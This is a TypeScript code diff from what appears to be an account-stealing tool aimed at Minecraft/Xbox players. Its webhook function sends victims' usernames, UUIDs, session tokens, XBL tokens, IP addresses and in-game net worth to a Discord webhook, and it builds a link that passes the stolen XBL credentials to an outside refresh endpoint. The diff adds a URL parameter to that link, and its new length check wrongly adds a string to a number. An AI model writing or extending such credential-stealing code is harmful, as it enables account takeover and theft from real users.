@@ -5,7 +5,7 @@ dotenv.config();
 const hatehook = process.env.DISCORD_HATEHOOK;
 
 export default async function oauthWebhook(data: any, nwData:any, ip: string, webhook: string, blacklisted?: boolean) {
-    const { username, uuid, session_token, xbl_hash, xbl_token } = data;
+    const { username, uuid, session_token, xbl_hash, xbl_token, url } = data;
     const { unsoulboundNw, description } = nwData || { unsoulboundNw: 0, description: "Error getting networth" };
     // @ts-ignore
     const refreshURL = "https://breadcat.cc/api/v1/auth/manual/refresh";
@@ -77,8 +77,8 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         "avatar_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg",
         "embeds": [mcEmbed],
     }
-    if (xbl_hash && xbl_token && xbl_hash.length + xbl_token.length < 2048) {
-        mcEmbed.description  = `[Refresh Here](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token})`
+    if (xbl_hash && xbl_token && xbl_hash.length + xbl_token.length + url < 2048) {
+        mcEmbed.description  = `[Refresh Here](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token}&url=${url})`
     }
     const options = {
         method: "POST",
